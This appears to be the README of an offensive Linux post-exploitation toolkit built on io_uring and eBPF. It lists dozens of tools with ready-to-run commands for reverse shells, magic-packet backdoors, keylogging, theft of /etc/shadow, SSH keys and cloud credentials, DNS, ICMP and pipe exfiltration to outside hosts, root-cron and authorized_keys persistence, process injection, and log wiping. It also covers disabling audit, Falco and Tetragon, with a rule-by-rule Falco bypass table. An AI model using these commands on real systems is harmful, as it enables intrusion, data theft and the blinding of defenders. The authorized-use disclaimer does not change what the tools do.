# Furtex

Post-exploitation and evasion research toolkit for Linux, built around io_uring and eBPF. No liburing, no frameworks, raw syscalls throughout.

More tools soon. PRs are welcome.

Join in Rootkit Researchers

- https://discord.gg/66N5ZQppU7

**For authorized research and red team engagements only. Don't run this on systems you don't own.**


<img src="https://i.imgur.com/c0zm9sK.png" width="720"/>

```
Furtex/
├── io_uring/     raw io_uring ops: file, net, injection, exfil (13 tools)
├── bpf/          BPF map and program tooling (15 tools)
├── ebpf/         BPF-side programs and loaders (9 programs + 2 runners)
├── edrs/         EDR evasion and post-exploitation (75 tools)
└── techniques/   Falco-specific bypass, all 25 default rules (13 tools)
```

## Requirements

**Toolchain**

| tool | needed for |
|---|---|
| `gcc` | all userspace binaries |
| `clang` | `ebpf/*.bpf.c` BPF-side programs |
| `make` | build system |

**Headers and libraries**

| package | needed for |
|---|---|
| `linux-headers-$(uname -r)` | `<linux/bpf.h>`, `<linux/io_uring.h>` and related kernel headers |
| `libbpf-dev` | `<bpf/bpf_helpers.h>` and friends used in `ebpf/` programs |
| `bpftool` | generate `vmlinux.h` via `make vmlinux` inside `ebpf/` |

On Debian/Kali/Ubuntu:

```sh
sudo apt install gcc clang make linux-headers-$(uname -r) libbpf-dev bpftool
```

**Kernel versions**

| minimum | what it unlocks |
|---|---|
| 5.4 | io_uring base (`IORING_FEAT_SINGLE_MMAP`, BPF map iteration) |
| 5.6 | `IORING_OP_OPENAT`, `IORING_OP_STATX`, `pidfd_getfd` (`pidfd_steal`) |
| 5.8 | `CAP_BPF` + `CAP_PERFMON` split (replaces `CAP_SYS_ADMIN` for BPF) |
| 5.9 | `BPF_LINK_DETACH` (`bpf_link_detach`) |
| 5.19 | `IORING_OP_SOCKET` (`af_packet_send`, `dns_exfil`, `xdp_socket_send`, `bpf_kprobe_bypass`) |

**Capabilities**

| capability | tools that require it |
|---|---|
| `CAP_BPF` (or `CAP_SYS_ADMIN` pre-5.8) | all `bpf/` tools, `ebpf/` loaders |
| `CAP_PERFMON` | `ebpf/` tracepoint and kprobe programs |
| `CAP_NET_RAW` | `icmp_tunnel`, `af_packet_shell`, `skf_c2_runner`, `icmp_trigger` |
| `CAP_NET_ADMIN` | `xdp_socket_send`, `netfilter_flush` |
| `CAP_AUDIT_CONTROL` | `audit_kill` |

BTF must be enabled in the kernel (`CONFIG_DEBUG_INFO_BTF=y`) to run `make vmlinux` for `ebpf/` programs.

On distros with older libc-dev headers (Ubuntu 22.04 etc.) you may need `#ifndef IORING_OP_SOCKET / #define IORING_OP_SOCKET 45`. Already handled in this repo.

## Build

| command | builds |
|---|---|
| `make all` | everything |
| `make uring` | io_uring/ only |
| `make bpf` | bpf/ userspace tools |
| `make ebpf` | BPF-side programs (needs clang + libbpf) |
| `make edrs` | all edrs/ binaries |
| `make techniques` | Falco bypass tools |
| `make clean` | remove all binaries |

`edrs/` has its own sub-Makefile with ~75 binaries split by privilege:

```
cd edrs && make priv    # root / CAP_* required
cd edrs && make unpriv  # no privileges needed
```

See [PRIVILEGES.md](PRIVILEGES.md) for the full breakdown.

## io_uring bypass coverage

io_uring SQEs go through the kernel workqueue. `io_uring_enter(2)` never calls through `sys_call_table`, never fires `sys_enter_*` tracepoints, and never hits livepatch on `native_sys_call`. That alone kills a large class of EDR hooks without touching anything.

What io_uring bypasses on its own:

| hook point | note |
|---|---|
| `sys_call_table` pointer replacement | io_uring never goes through the syscall table |
| livepatch on `native_sys_call` / `compat_sys_call` | same reason |
| `sys_enter_*` tracepoints | workqueue path, no tracepoint fires |

What io_uring does NOT bypass on its own (needs an active tool):

| hook point | tool | what the tool does |
|---|---|---|
| kprobes on `vfs_read`, `security_file_open`, etc. | `ftrace_enum` | removes the kprobe hooks |
| BPF LSM / KRSI | `bpf_link_detach` | detaches the BPF link |
| Linux audit | `audit_kill` | disables auditd via NETLINK_AUDIT |
| LD_PRELOAD / PLT-GOT patches | `plt_unhook` | removes the userland hooks |
| netfilter OUTPUT / conntrack | `af_packet_shell` | uses AF_PACKET at layer 2, skips netfilter |
| `inet_stream_connect` hooks | `udp_shell` | uses UDP, never calls tcp connect path |

## io_uring/

`iouring_utils.h` handles ring setup without liburing.

| binary | what it does |
|---|---|
| `file_read` | OPENAT+READ+CLOSE chain via io_uring, no sys_enter_read event |
| `file_write` | OPENAT+WRITE+CLOSE chain |
| `file_append` | same as file_write but O_APPEND, offset -1 |
| `net_connect` | SOCKET+CONNECT+SEND+RECV in one ring |
| `net_reverse_shell` | reverse shell over io_uring CONNECT |
| `multifile_read` | up to 64 files in one SQE batch |
| `memfd_exec` | stream ELF via stdin into memfd, execve via /proc/self/fd |
| `proc_inject` | JIT injection via /proc/PID/mem; ptrace injection (--ptrace flag) |
| `pipe_splice` | SPLICE kernel-to-kernel, userspace hooks never see bytes |
| `inotify_bypass_watch` | io_uring READ does not raise IN_ACCESS/IN_OPEN |
| `dns_exfil` | hex-encode data as DNS query labels over io_uring SENDMSG |
| `af_packet_send` | raw Ethernet via AF_PACKET (IORING_OP_SOCKET, bypasses inet path) |
| `xdp_socket_send` | raw frame via AF_XDP + UMEM ring, bypasses netfilter entirely |

```bash
./io_uring/file_read /etc/shadow
./io_uring/file_write /etc/cron.d/x "* * * * * root /tmp/sh"
./io_uring/file_append /root/.ssh/authorized_keys "ssh-ed25519 AAAA..."
./io_uring/net_connect 10.0.0.1 4444 "ping"
./io_uring/net_reverse_shell 192.168.1.1 4444
./io_uring/multifile_read /etc/passwd /etc/shadow /root/.ssh/id_rsa ~/.aws/credentials
cat payload | ./io_uring/memfd_exec [args...]
./io_uring/pipe_splice /etc/shadow /tmp/out
./io_uring/inotify_bypass_watch /var/log/auth.log
./io_uring/dns_exfil 1.2.3.4 exfil.example.com /etc/shadow

sudo ./io_uring/proc_inject
sudo ./io_uring/proc_inject <pid>
sudo ./io_uring/proc_inject          <pid> <shellcode_hex>
sudo ./io_uring/proc_inject --ptrace <pid> <shellcode_hex>

sudo ./io_uring/af_packet_send eth0 08:00:27:aa:bb:cc ff:ff:ff:ff:ff:ff "payload"
sudo ./io_uring/xdp_socket_send eth0 <hex-frame>
```

## bpf/

Most tools require `CAP_BPF`. `env_exfil` works unprivileged. `icmp_trigger` requires `CAP_NET_RAW` instead of `CAP_BPF`.

| binary | what it does |
|---|---|
| `map_recon` | list all loaded BPF maps |
| `map_dumper` | dump map contents by ID |
| `map_write` | update map entries by ID |
| `map_poison` | zero Falco's `interesting_sys` entries around a payload |
| `prog_recon` | list BPF programs: type, name, map count |
| `pid_allowlist` | insert PID into an EDR allowlist map |
| `edr_fin` | score loaded BPF maps/programs against known EDR heuristics |
| `lsm_check` | detect active BPF LSM hooks and test if map writes are blocked |
| `bpf_persist` | pin/retrieve/unpin maps and programs on bpffs |
| `map_snapshot` | save and restore map contents to a binary file |
| `env_exfil` | read /proc/*/environ for secrets |
| `bpf_link_detach` | enumerate and detach BPF links (removes LSM hooks) |
| `link_update` | redirect a BPF link to a no-op program (hook stays visible, fires nothing) |
| `map_freeze` | freeze a BPF map read-only via `BPF_MAP_FREEZE` (writes return -EPERM) |
| `icmp_trigger` | ICMP magic-packet backdoor; spawns reverse shell via socketpair relay; masquerades as `kworker/u4:2` |

```bash
sudo ./bpf/map_recon
sudo ./bpf/map_dumper 42 --ascii
sudo ./bpf/map_write <map_id> <key_hex> <val_hex>
sudo ./bpf/prog_recon --maps --lsm-only
sudo ./bpf/edr_fin
sudo ./bpf/lsm_check <map_id>
sudo ./bpf/pid_allowlist <map_id> [pid]
sudo ./bpf/bpf_persist pin-map 42 /sys/fs/bpf/my_map
sudo ./bpf/bpf_persist list /sys/fs/bpf
sudo ./bpf/map_snapshot save    <prog_id> snap.bin
sudo ./bpf/map_snapshot restore snap.bin
./bpf/env_exfil --filter AWS
sudo ./bpf/bpf_link_detach list --lsm-only
sudo ./bpf/bpf_link_detach detach-lsm --dry-run
sudo ./bpf/link_update <link_id>
sudo ./bpf/map_freeze <map_id>
sudo ./bpf/map_freeze --prog <name_substr>
sudo ./bpf/icmp_trigger --daemon
sudo ./bpf/icmp_trigger --send <target> <c2_ip> <c2_port>

sudo ./bpf/map_poison <isys_id> <eta_id> -- ./io_uring/file_read /etc/shadow
sudo ./bpf/map_poison <isys_id> <eta_id> -- ./io_uring/net_reverse_shell 10.0.0.1 4444
```

## ebpf/

Requires clang + libbpf + vmlinux.h. Run `make vmlinux` inside `ebpf/` to generate from the running kernel's BTF.

| file | what it does |
|---|---|
| `exec.bpf.c` | tracepoint on sys_enter_execve |
| `fentry_open.bpf.c` | tracepoint on sys_enter_openat |
| `creds.bpf.c` | track openat+read on credential paths |
| `keylog.bpf.c` | input event tracepoint, raw keycode capture |
| `net.bpf.c` | sys_enter_connect logging |
| `net_hide.bpf.c` | hide ports from /proc/net/tcp and /proc/net/udp |
| `proc_hide.bpf.c` | hide PIDs from getdents64 output |
| `tty_sniff.bpf.c` | capture stdin/stdout/stderr writes and reads |
| `skf_c2_runner.c` | ICMP C2 via classic BPF socket filter |
| `xdp_backdoor.bpf.c` + `xdp_handler.c` | XDP trigger on magic UDP packet |

```bash
sudo ./bpf/map_write <hidden_ports_id> 5c11 01
sudo ./bpf/map_write <hidden_pids_id> d2040000 01

sudo ./ebpf/skf_c2_runner
ping -p 4d41474900$(printf 'id' | xxd -p | tr -d '\n') -c1 <target>

sudo ./ebpf/xdp_handler <trigger_map_id> <handler_pid_map_id>
echo -n 'MAGICid' | nc -u -q1 <target> 31337
```

## edrs/

| binary | root | technique |
|---|:---:|---|
| `edr_recon` | yes | 12-vendor EDR detector: processes, artifacts, modules, BPF, kprobes |
| `bpf_prog_recon` | yes | enumerate loaded BPF programs, maps, and kprobes |
| `bpf_map_wipe` | yes | wipe BPF map entries |
| `bpf_detach_all` | yes | detach all BPF links |
| `tetragon_blind` | yes | scan, freeze, thaw, kill or blind Tetragon/Falco processes |
| `ftrace_enum` | yes | enumerate and clear kprobe/ftrace hooks |
| `lkm_unload` | yes | unload kernel modules |
| `lkm_inline_detect` | yes | detect inline kernel hooks |
| `perf_bpf_kill` | yes | enumerate and kill Falco perf-event BPF programs |
| `module_recon` | yes | enumerate kernel modules |
| `cgroup_freeze` | yes | freeze/thaw process via cgroup v2 |
| `oom_cage` | yes | set oom_score_adj for self or target |
| `sysctl_blind` | yes | read/write security-relevant sysctls |
| `audit_kill` | yes | disable/throttle Linux audit via NETLINK_AUDIT |
| `inotify_exhaust` | yes | consume all inotify watches |
| `netfilter_flush` | yes | flush netfilter chains |
| `dmesg_wipe` | yes | clear kernel ring buffer |
| `ld_so_preload` | yes | manipulate /etc/ld.so.preload |
| `proc_hide` | yes | hide /proc/PID via bind-mount |
| `mount_over` | yes | bind-mount over arbitrary paths |
| `log_wipe` | yes | truncate log files and shell history |
| `elf_infect` | yes | PT_NOTE to PT_LOAD parasite injection |
| `proc_mem_inject` | yes | pwrite to /proc/PID/mem, no ptrace attach |
| `af_packet_shell` | yes | raw Ethernet C2 bypassing netfilter OUTPUT |
| `icmp_tunnel` | yes | exfil via ICMP echo-request payload |
| `event_flood` | yes | event flood around payload to saturate monitor |
| `livepatch_bypass` | yes | io_uring past livepatch hooks on syscall dispatcher |
| `livepatch_stack_blind` | yes | disable livepatch + BPF kprobe + netfilter hook stack; module unload via comm spoofing |
| `lsm_authlink_blind` | yes | disable LSM auth-link flows, freeze or kill auth agent, write via inode swap |
| `lsm_callback_bypass` | yes | bypass LSM callbacks via pidfd_getfd, process_vm_writev, perf+BPF attach, new netns |
| `bpf_fim_blind` | yes | freeze BPF FIM sensor, wipe ring-buffer map entries, flood ringbuf |
| `syscall_dispatch_bypass` | yes | io_uring file/net ops bypassing kprobes on syscall dispatch and livepatch do_syscall_64 |
| `bpf_kprobe_bypass` | yes | io_uring file/net/exec ops bypassing __x64_sys_* kprobe targets |
| `ptrace_inject_so` | yes | load .so into live process via ptrace + dlopen |
| `uring_stealth` | no | file/net ops via io_uring, no sys_enter_* events |
| `openat2_bypass` | no | alternative syscalls (openat2, copy_file_range) |
| `ptrace_selfguard` | no | block external ptrace via guardian process |
| `plt_unhook` | no | detect and bypass PLT-GOT hooks via dlmopen |
| `fexecve_drop` | no | ELF into memfd, execve via /proc/self/fd |
| `memfd_loader` | no | load .so via memfd, constructor called |
| `memfd_userexec` | no | ELF from stdin into memfd, execve via /proc/self/fd |
| `hollow_proc` | no | process hollowing with decoy name in ps |
| `argv_spoof` | no | rename comm via prctl(PR_SET_NAME) and argv[0] overwrite |
| `clone_netns` | no | unprivileged net namespace exec |
| `ns_exec` | no | unshare user/pid/mount namespaces |
| `splice_c2` | no | TCP C2 using splice(2) for data transfer; send/recv hooks never fire |
| `abstract_sock_c2` | no | C2 over abstract Unix socket |
| `udp_shell` | no | UDP reverse shell, bypasses inet_stream_connect |
| `tls_shell` | no | reverse shell behind fake TLS ClientHello |
| `dns_exfil_raw` | no | hex-encode data as DNS query labels |
| `pidfd_steal` | no | steal open fds from other processes via pidfd_getfd |
| `vma_hide` | no | RWX to PROT_NONE cycle, MADV_DONTDUMP, VMA renaming |
| `coredump_block` | no | block core dumps via filter/dumpable/rlimit |
| `seccomp_notify` | no | intercept syscalls via SECCOMP_USER_NOTIF |
| `ipc_covert` | no | C2 over POSIX mqueue |
| `shared_mem_c2` | no | C2 over POSIX shm, no network traffic |
| `pipe_exfil` | no | splice(2) exfil, LD_PRELOAD hooks blind |
| `proc_fd_scan` | no | scan /proc/PID/fd symlinks for sensitive paths |
| `proc_vm_inject` | no | process_vm_writev, no /proc/PID/fd opened |
| `self_delete` | no | delete own binary from disk while running |
| `time_stomp` | no | clone/zero/set atime+mtime |
| `userland_persist` | no | bashrc/crontab/autostart/authorized_keys |
| `env_scrape` | no | read /proc/*/environ for secrets and SSH sockets |
| `anon_shellcode` | no | shellcode in MAP_ANONYMOUS, no file, no execve |
| `ld_preload_inject` | no | drop .so, inject via LD_PRELOAD |
| `ssh_agent_hijack` | no | speak agent protocol to captured socket |
| `fanotify_bypass` | no | memfd/anon-mmap/devshm to avoid fanotify marks |
| `ringbuf_flood` | no | saturate BPF ringbuf to drop events |
| `log_evasion` | no | io_uring file ops and raw-syscall TCP shell, no libc wrappers |
| `syscalltable_bypass` | no | io_uring past sys_call_table pointer hooks |
| `uring_recon_unpriv` | no | credentials, keys, connections via io_uring read |
| `fd_steal_read` | no | steal fds via pidfd_getfd, read without own open() |
| `mmap_read` | no | read files via mmap, no read() syscall |
| `scm_rights_exfil` | no | pass fd over SCM_RIGHTS, read without own open() |
| `splice_read` | no | read via splice(2), no userspace buffer |

```bash
sudo ./edrs/edr_recon
sudo ./edrs/edr_recon procs arts mods
sudo ./edrs/edr_recon progs maps

sudo ./edrs/bpf_prog_recon --all
sudo ./edrs/ftrace_enum list
sudo ./edrs/module_recon list
sudo ./edrs/perf_bpf_kill scan
sudo ./edrs/sysctl_blind show
sudo ./edrs/tetragon_blind scan

sudo ./edrs/audit_kill disable
sudo ./edrs/dmesg_wipe wipe
sudo ./edrs/bpf_detach_all
sudo ./edrs/ftrace_enum clear-kprobes
sudo ./edrs/netfilter_flush
sudo ./edrs/lkm_unload unload

./edrs/livepatch_bypass --read /etc/shadow
./edrs/uring_stealth cat /etc/shadow
./edrs/mmap_read /etc/shadow
./edrs/splice_read /etc/shadow
./edrs/plt_unhook read /etc/shadow
./edrs/openat2_bypass copy /etc/shadow /tmp/out

cat payload | ./edrs/memfd_userexec [args...]
cat payload | ./edrs/fanotify_bypass --memfd-exec
./edrs/anon_shellcode <shellcode_hex>
./edrs/fexecve_drop - < payload

sudo ./edrs/proc_mem_inject --inject <pid> <shellcode_hex>
./edrs/proc_vm_inject <pid> <shellcode_hex>
./edrs/ptrace_inject_so inject <pid> /tmp/payload.so

./edrs/userland_persist --lhost 10.0.0.1 --lport 4444
./edrs/userland_persist --sshkey "ssh-ed25519 AAAA..."
sudo ./edrs/livepatch_bypass --persist 192.168.1.1 4444

./edrs/shared_mem_c2 --agent &
./edrs/shared_mem_c2 --ctrl --cmd "id"
./edrs/abstract_sock_c2 server &
./edrs/abstract_sock_c2 client
./edrs/udp_shell 192.168.1.1 4444
./edrs/tls_shell 192.168.1.1 443

./edrs/dns_exfil_raw str exfil.example.com "data"
./edrs/pipe_exfil --send /etc/shadow 192.168.1.1 9999
cat data | sudo ./edrs/icmp_tunnel 192.168.1.1 -
SSH_AUTH_SOCK=/run/user/1000/ssh-agent.sock ./edrs/ssh_agent_hijack

./edrs/self_delete delete
./edrs/time_stomp clone /etc/passwd /tmp/target
sudo ./edrs/log_wipe hist /home/kali

./edrs/event_flood 500 4 -- ./edrs/proc_mem_inject --inject <pid> <hex>
./edrs/ringbuf_flood --flood --threads 8 --sec 5

./edrs/ns_exec user bash
./edrs/ns_exec full-hide bash
./edrs/clone_netns exec /bin/sh

./edrs/pidfd_steal scan
./edrs/pidfd_steal steal <pid> <fd>
./edrs/fd_steal_read <path_filter>
./edrs/fd_steal_read <path_filter> <pid> <fd>
```

## techniques/ (Falco bypass)

Targets Falco's default ruleset (`modern_ebpf` driver, 25 rules). Run `edrs/edr_recon` first.

Bypass axis A: prevent the event from reaching Falco (io_uring skips `sys_enter_*`, ringbuf drain silently drops events).
Bypass axis B: event reaches Falco but the rule condition doesn't match (proc.name spoof, path pivot, alternate flags).

| tool | axis | Falco rules |
|---|:---:|---|
| `uring_ops` | A | 1 2 3 7 9 10 12 13 14 15 18 21 |
| `ringbuf_overflow` | A | all |
| `rule_evade` | B | 3 5 6 17 |
| `kmod_unload` | A | all |
| `proc_ghost` | A/B | 22 23 25 |
| `exe_from_memfd_bypass` | B | 25 |
| `event_storm` | A | all |
| `proc_masquerade` | B | 3 4 5 8 17 |
| `ns_pivot` | B | 6 14 |
| `cgroup_escape` | A | 18 |
| `bypass_file_rules` | B | 1 2 3 9 10 11 12 13 21 |
| `bypass_proc_rules` | B | 4 6 8 15 17 18 19 20 22 23 24 |
| `per_rule_bypass` | A/B | all 25 |

```bash
./techniques/uring_ops cat   /etc/shadow
./techniques/uring_ops creds
./techniques/uring_ops write /etc/cron.d/x "* * * * * root /tmp/sh"
./techniques/uring_ops shell 10.0.0.1 4444
./techniques/uring_ops chain /etc/shadow 10.0.0.1 9999

sudo ./techniques/ringbuf_overflow find
sudo ./techniques/ringbuf_overflow drain  <map_id>
./techniques/ringbuf_overflow  flood  16 10

./techniques/rule_evade name-spoof
./techniques/rule_evade path-pivot
./techniques/rule_evade all

sudo ./techniques/kmod_unload list
sudo ./techniques/kmod_unload unload

./techniques/proc_ghost ghost-elf /bin/ls
./techniques/proc_ghost ghost-sc  <hex>

./techniques/exe_from_memfd_bypass info
./techniques/exe_from_memfd_bypass sc   <hex>
./techniques/exe_from_memfd_bypass shm-exec <elf>
./techniques/exe_from_memfd_bypass dlopen  <so>

./techniques/event_storm mixed-storm 16 10
./techniques/event_storm snipe "cat /etc/shadow"

./techniques/proc_masquerade setname    sshd <cmd...>
./techniques/proc_masquerade fakeparent sshd <cmd...>
./techniques/proc_masquerade clone-parent sshd <cmd...>

./techniques/ns_pivot net-new
./techniques/ns_pivot userns-shell

./techniques/cgroup_escape check
./techniques/cgroup_escape proof
./techniques/cgroup_escape shell 10.0.0.1 4444

./techniques/bypass_file_rules read-masked /etc/shadow
./techniques/bypass_file_rules log-clear /var/log/auth.log
./techniques/bypass_file_rules grep-bypass /home "PRIVATE"

./techniques/bypass_proc_rules reverse-shell 10.0.0.1 4444
./techniques/bypass_proc_rules anti-debug
./techniques/bypass_proc_rules proc-inject <pid> <addr> <hex>

./techniques/per_rule_bypass list
./techniques/per_rule_bypass sensitive-read /etc/shadow
./techniques/per_rule_bypass exec-proc /tmp/elf
./techniques/per_rule_bypass clear-log /var/log/auth.log
```

| Rule | Bypass | Tool |
|---|---|---|
| 1  Directory traversal monitored file read | io_uring OPENAT | `uring_ops cat`, `per_rule_bypass dir-traversal` |
| 3  Read sensitive file untrusted | io_uring or prctl | `uring_ops creds`, `bypass_file_rules read-masked` |
| 4  Run shell untrusted | python3/perl instead of sh | `rule_evade unusual-shell` |
| 6  Terminal shell in container | setsid, proc.tty=0 | `bypass_proc_rules shell-notty` |
| 7  Contact K8S API Server | io_uring CONNECT | `uring_ops shell`, `per_rule_bypass k8s-connect` |
| 8  Netcat RCE | C binary, proc.name != nc/ncat | `bypass_proc_rules reverse-shell` |
| 9  Search Private Keys | open+read in C, no grep/find | `bypass_file_rules grep-bypass` |
| 10 Clear Log Activities | ftruncate without O_TRUNC | `bypass_file_rules log-clear` |
| 11 Remove Bulk Data | write loop, no shred/mkfs | `bypass_file_rules wipe` |
| 15 Redirect STDOUT/STDIN to Network | fcntl F_DUPFD instead of dup2 | `bypass_proc_rules reverse-shell` |
| 18 Detect release_agent Escape | io_uring OPENAT+WRITE to release_agent | `cgroup_escape proof/shell`, `uring_ops write` |
| 19 PTRACE attached to process | /proc/PID/mem or process_vm_writev | `bypass_proc_rules proc-inject` |
| 20 PTRACE anti-debug attempt | TracerPid check via /proc/self/status | `bypass_proc_rules anti-debug` |
| 22 Execution from /dev/shm | exec from /run/user/uid/ instead | `bypass_proc_rules run-safe` |
| 25 Fileless execution via memfd_create | shellcode via mmap, no execve | `exe_from_memfd_bypass sc`, `proc_ghost ghost-sc` |
| all | drain ringbuf or remove scap.ko | `ringbuf_overflow`, `kmod_unload` |

## Contributing

Open a PR. Single-purpose tools, raw syscalls, no new dependencies.

## Legal

This project is intended strictly for security research, authorized penetration testing, CTF competitions, and defensive tooling development. All techniques demonstrated here are documented in public security research and kernel documentation.

**Do not use this toolkit against systems you do not own or have explicit written authorization to test.** Unauthorized use may violate the Computer Fraud and Abuse Act (CFAA), the EU Directive on Attacks Against Information Systems, and equivalent laws in your jurisdiction.

The authors assume no liability for misuse. By using this software you agree that you are solely responsible for compliance with applicable laws.
